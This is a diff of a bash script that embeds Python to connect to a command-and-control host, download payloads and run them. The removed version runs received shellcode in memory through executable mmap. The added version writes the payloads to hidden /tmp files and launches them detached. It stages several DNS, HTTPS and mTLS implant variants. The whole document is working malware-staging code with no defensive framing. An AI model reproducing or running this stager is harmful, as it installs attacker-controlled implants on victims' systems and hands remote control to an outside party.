@@ -1,64 +1,53 @@
 #!/bin/bash
 
-# TCP stager function - connects, reads 4 byte size header, reads shellcode, executes in memory
-tcp_stage() {
-    local host=$1
-    local port=$2
-    local name=$3
+C2="secure.glyphforge.net"
+
+stage() {
+    local port=$1
+    local drop=$2
 
     python3 - <<EOF
-import socket, struct, os, ctypes, sys
+import socket, struct, os, stat
 
-def stage(host, port):
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(10)
-        s.connect((host, port))
-        
-        # Read 4 byte size header
-        size_data = s.recv(4)
-        if len(size_data) < 4:
-            return False
-        size = struct.unpack('<I', size_data)[0]
-        
-        # Read shellcode
-        shellcode = b''
-        while len(shellcode) < size:
-            chunk = s.recv(size - len(shellcode))
-            if not chunk:
-                break
-            shellcode += chunk
-        s.close()
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(10)
+    s.connect(("$C2", $port))
+    size_data = s.recv(4)
+    size = struct.unpack('<I', size_data)[0]
+    data = b''
+    while len(data) < size:
+        chunk = s.recv(size - len(data))
+        if not chunk:
+            break
+        data += chunk
+    s.close()
 
-        # Execute shellcode in memory
-        lib = ctypes.CDLL(None)
-        sc = ctypes.create_string_buffer(shellcode)
-        ptr = lib.mmap(0, len(shellcode), 0x7, 0x22, -1, 0)  # PROT_READ|WRITE|EXEC
-        ctypes.memmove(ptr, sc, len(shellcode))
-        func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
-        func()
-        return True
-    except Exception as e:
-        return False
-
-stage("$host", $port)
+    with open("$drop", "wb") as f:
+        f.write(data)
+    os.chmod("$drop", stat.S_IRWXU)
+    pid = os.fork()
+    if pid == 0:
+        os.setsid()
+        os.execv("$drop", ["$drop"])
+    print("[+] $drop started")
+except Exception as e:
+    print(f"[-] Failed port $port: {e}")
 EOF
 }
-
-C2="secure.glyphforge.net"
 
 echo "[*] Staging implants..."
 
 # Linux DNS
-tcp_stage $C2 1111 "linuxDNS_B"
-tcp_stage $C2 1112 "linuxDNS_S"
+stage 1111 "/tmp/.dns_b"
+stage 1112 "/tmp/.dns_s"
 
 # Linux HTTPS
-tcp_stage $C2 1221 "linuxHTTP_B"
-tcp_stage $C2 1222 "linuxHTTP_S"
+stage 1221 "/tmp/.http_b"
+stage 1222 "/tmp/.http_s"
 
 # Linux MTLS
-tcp_stage $C2 1331 "linuxMTLS_B"
-tcp_stage $C2 1332 "linuxMTLS_S"
+stage 1331 "/tmp/.mtls_b"
+stage 1332 "/tmp/.mtls_s"
 
 echo "[*] Done"
